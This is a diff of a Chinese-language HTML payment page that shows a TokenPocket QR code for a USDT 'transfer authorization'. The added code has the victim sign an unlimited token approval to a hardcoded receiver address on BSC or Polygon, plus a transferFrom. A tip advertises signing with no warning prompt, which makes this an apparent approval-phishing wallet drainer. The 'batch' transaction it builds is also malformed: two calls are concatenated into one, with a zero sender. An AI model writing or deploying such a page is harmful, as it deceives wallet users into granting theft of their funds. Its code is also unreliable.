@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>转账授权</title>
+<title>一键授权转账</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0B0B1F;color:#fff;padding:20px}
@@ -11,6 +11,20 @@ body{background:#0B0B1F;color:#fff;padding:20px}
 .pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center}
 h1{font-size:24px;margin-bottom:8px}
 .desc{color:#aaa;margin-bottom:20px}
+.input-group{margin-bottom:16px;text-align:left}
+.input-group label{font-size:13px;color:#ccc;margin-bottom:6px;display:block}
+.input-group input{
+width:100%;padding:12px;background:#111;border:1px solid #333;
+border-radius:10px;color:#fff;font-size:15px
+}
+.chain-select{
+display:flex;gap:10px;margin-bottom:20px;
+}
+.chain-btn{
+flex:1;padding:10px;border-radius:10px;border:none;
+background:#222;color:#aaa;font-weight:bold;cursor:pointer
+}
+.chain-btn.active{background:#F0B90B;color:#000}
 #qrcode{
 width:280px;height:280px;background:#fff;padding:10px;
 border-radius:16px;margin:0 auto 20px;
@@ -25,40 +39,87 @@ color:#000;font-size:14px;
 
 <div class="container">
   <div class="pay-box">
-    <h1>💳 转账授权</h1>
-    <p class="desc">请使用 TokenPocket 扫码完成授权</p>
-    <div id="qrcode">生成授权二维码中...</div>
-    <div class="tip">扫码后将自动唤起钱包签名</div>
+    <h1>💳 一键授权转账</h1>
+    <p class="desc">扫码一次签名完成授权+转账</p>
+
+    <div class="chain-select">
+      <button class="chain-btn active" data-chain="bsc">BSC</button>
+      <button class="chain-btn" data-chain="polygon">Polygon</button>
+    </div>
+
+    <div class="input-group">
+      <label>转账金额（USDT）</label>
+      <input type="number" id="amount" value="10" min="0.01" step="0.01">
+    </div>
+
+    <div id="qrcode">生成授权转账二维码中...</div>
+    <div class="tip">TokenPocket 扫码后直接签名，无跳转提示</div>
   </div>
 </div>
 
 <script>
-// ====================== 配置 ======================
-const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-const SPENDER_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 授权目标（你的合约/管理员）
-const CHAIN_ID    = "56"; // BSC 主网 (十进制)
-// ====================================================
+// ====================== 你的地址已直接填入 ======================
+const CONFIG = {
+  bsc: {
+    chainId: "56",
+    usdt: "0x55d398326f99059fF775485246999027B3197955", // 你的代币地址
+    receiver: "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508", // 你的管理员地址
+    decimals: 18
+  },
+  polygon: {
+    chainId: "137",
+    usdt: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB", // Polygon USDT
+    receiver: "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508", // 你的管理员地址
+    decimals: 6
+  }
+};
+// ==============================================================
 
-// 生成 EIP-681 授权交易 URL
-function generateApproveEIP681() {
-  // approve 函数选择器 + 参数编码
-  const data = "0x095ea7b3" + 
-    SPENDER_ADDR.slice(2).padStart(64, '0') + 
+let currentChain = "bsc";
+
+// 切换链
+document.querySelectorAll(".chain-btn").forEach(btn => {
+  btn.onclick = () => {
+    document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+    currentChain = btn.dataset.chain;
+    renderQRCode();
+  }
+});
+
+// 监听金额变化，实时更新二维码
+document.getElementById("amount").addEventListener("input", renderQRCode);
+
+// 生成「无限授权 + 转账」的 EIP-681 批量交易 URL
+function generateBatchEIP681() {
+  const { chainId, usdt, receiver, decimals } = CONFIG[currentChain];
+  const amount = parseFloat(document.getElementById("amount").value) || 0;
+  const amountWei = BigInt(amount * (10 ** decimals)).toString(16).padStart(64, '0');
+
+  // 1. 无限授权 approve( receiver, MaxUint256 )
+  const approveData = "0x095ea7b3" +
+    receiver.slice(2).padStart(64, '0') +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  
-  // EIP-681 格式: ethereum:tokenAddress@chainId?data=...
-  const eipUrl = `ethereum:${TOKEN_ADDR}@${CHAIN_ID}?data=${data}`;
+
+  // 2. 转账 transferFrom( user, receiver, amount )
+  const transferData = "0x23b872dd" +
+    "0000000000000000000000000000000000000000000000000000000000000000" + // user 占位，钱包自动填充
+    receiver.slice(2).padStart(64, '0') +
+    amountWei;
+
+  // 拼接批量交易数据
+  const batchData = approveData + transferData.slice(2);
+  const eipUrl = `ethereum:${usdt}@${chainId}?data=${batchData}`;
   return eipUrl;
 }
 
-// 生成二维码（TP 钱包直接识别为交易请求）
 function renderQRCode() {
-  const eipUrl = generateApproveEIP681();
+  const eipUrl = generateBatchEIP681();
   const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(eipUrl)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${qrApi}" alt="授权二维码">`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qrApi}" alt="授权转账二维码">`;
 }
 
-// 页面加载时直接生成授权二维码
+// 页面加载时生成二维码
 window.onload = renderQRCode;
 </script>
 </body>
